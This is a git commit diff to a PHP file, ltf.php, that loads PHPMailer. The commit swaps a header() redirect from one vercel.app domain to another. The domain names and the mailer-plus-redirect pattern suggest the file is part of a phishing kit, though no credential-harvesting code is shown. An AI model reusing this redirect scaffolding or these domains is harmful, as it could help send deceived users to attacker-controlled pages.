267ccdf70aed03df70063cc4c2affde1d566769a
team11203 <155807397+team11203@users.noreply.github.com>
2025-07-22 08:38:22 +0500

    Update ltf.php

--- ltf.php
+++ ltf.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://instant-send-issue-remove.vercel.app/");
+header("Location:https://a-you-on-se.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
